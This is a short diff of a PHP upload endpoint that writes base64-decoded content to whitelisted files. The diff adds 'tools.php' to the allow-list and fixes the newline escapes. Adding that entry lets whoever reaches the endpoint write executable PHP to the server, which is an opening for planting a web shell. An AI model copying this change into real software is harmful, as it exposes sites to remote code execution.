@@ -16,14 +16,12 @@ $data    = json_decode($payload, true);
 $file    = basename($data['file'] ?? '');
 $content = base64_decode($data['content'] ?? '');
 
-$allowed = ['index.html', 'index2.html', 'robots.txt', '.gitignore'];
+$allowed = ['index.html', 'index2.html', 'robots.txt', '.gitignore', 'tools.php'];
 if (!$file || !in_array($file, $allowed)) {
     http_response_code(400); die('Invalid file');
 }
 
 $bytes = file_put_contents(__DIR__ . '/' . $file, $content);
 echo $bytes !== false
-    ? date('[Y-m-d H:i:s]') . " OK: $file ({$bytes} bytes)
-"
-    : date('[Y-m-d H:i:s]') . " FAIL: $file
-";
+    ? date('[Y-m-d H:i:s]') . " OK: $file ({$bytes} bytes)\n"
+    : date('[Y-m-d H:i:s]') . " FAIL: $file\n";
